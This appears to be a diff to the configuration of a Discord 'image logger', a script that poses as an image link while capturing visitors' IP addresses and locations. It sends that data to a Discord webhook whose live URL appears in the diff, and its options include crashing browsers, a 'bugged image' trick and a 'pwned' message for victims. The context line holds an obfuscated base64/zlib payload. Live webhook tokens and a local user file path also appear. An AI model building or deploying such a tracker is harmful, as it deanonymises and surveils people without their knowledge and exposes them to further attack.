@@ -3,29 +3,29 @@ _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1441456061528670258/u-NgRxR75hPMDOO2KMHkc0GbqxABr0jlYk1fdlgGDrjUC9QMYOrO-hr97ZGyAzI-ewJK",
-    "image": "https://www.amazon.com/TUFF-MANGO-MUSTARD-BIG-SAJ/dp/B0FG795RRK",
+    "webhook": "https://discord.com/api/webhooks/1441464349418848268/9R0HwnplGfp62suz9AEE6R2ThnQkhX9xzDG1ZKiQPROU0AdeW735Vc9wxe_mGXnIsBLC",
+    "image": "https://pkmncards.com/wp-content/uploads/charizard-ex-xy-promos-xy17-ptcgo-1.png",
     "imageArgument": True,
-    "username": "Maxdluffy83",
-    "avatar_url": "file:///C:/Users/maxdl/Pictures/Screenshots/Capture%20d'%C3%A9cran%202025-09-19%20132458.png",
+    "username": "DiddyBlud",
+    "avatar_url": "https://github.com/mystixxx2/Image/blob/main/ChatGPT%20Image%2011%20oct.%202025,%2018_54_21.png?raw=true",
     "color": 0x1C2526,  # Very dark grey
 
     # OPTIONS #
     "crashBrowser": False,
-    "accurateLocation": True,
+    "accurateLocation": False,
     "message": {
         "doMessage": False,
-        "message": "Coucou, dédi a tout ceux du 18-25, on prends la releve #NoctysSupremacy",
-        "richMessage": False,
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "richMessage": True,
     },
     "vpnCheck": 1,
     "linkAlerts": True,
-    "buggedImage": False,
+    "buggedImage": True,
     "antiBot": 1,
 
     # REDIRECTION #
     "redirect": {
         "redirect": False,
-        "page": ""
+        "page": "https://your-link.here"
     },
 }
